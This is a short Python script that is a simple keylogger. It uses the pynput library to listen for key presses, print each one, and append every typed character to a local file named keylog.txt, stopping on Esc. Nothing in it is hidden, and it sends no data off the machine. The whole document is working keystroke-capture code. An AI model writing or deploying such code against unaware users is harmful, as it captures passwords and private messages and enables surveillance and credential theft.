import sys
from pynput import keyboard

def keyinput(key):
    print(str(key))
    if not isinstance(key,keyboard.Key):
        with open("keylog.txt",'a') as logkey:
            char=key.char
            logkey.write(char)
    else:
        if key==keyboard.Key.esc:
            sys.exit()        




if __name__=="__main__":
    listener=keyboard.Listener(on_press=keyinput)
    listener.start()
    input()
    
    
    